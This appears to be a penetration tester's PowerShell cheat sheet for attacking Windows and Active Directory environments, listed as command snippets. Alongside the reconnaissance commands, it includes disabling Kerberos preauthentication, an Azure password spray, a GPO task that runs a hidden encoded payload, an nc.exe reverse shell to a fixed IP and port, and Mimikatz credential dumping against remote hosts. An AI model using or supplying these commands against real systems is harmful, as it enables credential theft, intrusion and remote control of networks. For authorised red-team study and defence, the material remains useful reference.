####PowerShell Tips and Tricks

List all services that do not run as a standard account----Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\* | Where-Object {($_.ObjectName -notlike 'NT Authority\*') -and ($_.ObjectName -ne $null) -and ($_.ObjectName -ne "LocalSystem")}


##Remoting
Create a PSCredential----##$username="foo";$pass = ConvertTo-SecureString "bar" -AsPlainText -Force; New-Object -TypeName PSCredential -ArgumentList $username,$pass
Enter a Remote Session (admin access required)----##$sess= New-PSSession -ComputerName remotehost; Enter-PSSession -ComputerName remotehost
Run a Remote Command----Get-WMIObject –ComputerName remotehost –query "Select * from Win32_Service Where Name=‘LanManServer'"" | Format-Table


Disable Kerberos PreAuth----Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose

Import a Module----Import-Module .\MSOLSpray.ps1; 
Azure Password Spray----Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring2020"

PowerShell Command History File----% AppData Roaming Microsoft Windows PowerShell PSReadLine ConsoleHost_history.txt

##WMIC
List all Files in Directory----Get-ChildItem C:\Users\user -Recurse
List Scheduled Tasks----
Raw WMIC Query----Get-CimInstance -Query "SELECT * from Win32_Process WHERE name LIKE 'P%'"
Get AVs Installed----Get-CimInstance -Namespace root\securitycenter2 -ClassName antispywareproduct
List All Namespaces----Get-WmiObject -Namespace root\CIMv2 -list
List Running Servcies----Get-WmiObject -Query "SELECT * FROM win32_service WHERE state='running'" 
List Services Beginning with "T"----Get-WmiObject -Query "SELECT * FROM win32_service WHERE name LIKE '[tT]%'"
List Processes Like "owershell"----gwmi win32_process -Filter "name LIKE ‘_owershell%'"
Remote Get-WMIObject Command----Get-WMIObject –ComputerName remotehost –query “Select * from Win32_Service Where Name=‘LanManServer’” | Format-Table

##Bloodhound
EXE Ingestor----.\SharpHound.exe --CollectionMethod All --LDAPUser &lt;UserName&gt; --LDAPPass &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;
Powershell Ingestor (SharpHound.ps1)----Invoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;


##PowerSploit
Enumerate User----Get-NetUser &lt;user&gt;
Enumerate Group----Get-NetGroup &lt;group&gt;
Enumerate Computers----Get-NetComputer -FullData
Enumerate Live Machines----Get-NetComputer -Ping
Get Groups for which User is member----Get-NetGroup -Username &lt;user&gt;
Group Members----Get-NetGroupMember &lt;group&gt; -Domain &lt;DomainName&gt;
Enumerate Domain Shares----Find-DomainShare (-CheckShareAccess)
Enumerate Group Policies----Get-NetGPO
Enumerate Group Policy for Specific Computer----Get-NetGPO -ComputerName cpu.local
Enumerate OUs----Get-NetOU
Enumerate ACLs----Get-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs
Find Interesting ACes----Invoke-ACLScanner -ResolveGUIDs
Check ACLs associated with SMB Share----Get-PathAcl -Path "\\Path\to\share"
Enumerate Domain Trusts----Get-NetDomainTrust
Enumerate Forest Trusts----Get-NetForestDomain
Find All Local Admins----Invoke-EnumerateLocalAdmin -Verbose
Find Computers Where DA has Session----Invoke-UserHunter -GroupName "RDPUsers" (-Stealth)

Get all effective member of group----Get-NetGroupMember -GroupName &lt;group&gt; -Recurse
Search the forest global catalog----Get-NetUser -UserName &lt;user&gt; -ADSpath "GC: //domain.com"
Find Privileged Machine Accounts----Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}

Find Domain Admins and Users with same first/last name----Get-NetGroupMember -GroupName "Domain Admins" -FullData | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)"} | Select-Object -Property displayname,samaccountname
New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMAPQBO...' -Force
Check Last Password Change----Get-UserProperty -Properties pwdlastset
Find Logged In Users----Get-NetLoggedOn -ComputerName &lt;ComputerName&gt;

Basic NC connectback----powershell.exe -NoExit -Command 'C:/temp/temp2/nc.exe -v 192.168.99.21 4444 -e powershell'

##Mimikatz
Dump Creds----Invoke-Mimikatz -DumpCreds -ComputerName remotehost
Execute Classic Mimikatz Commands----Invoke-Mimikatz -Command '"privilege::debug"'



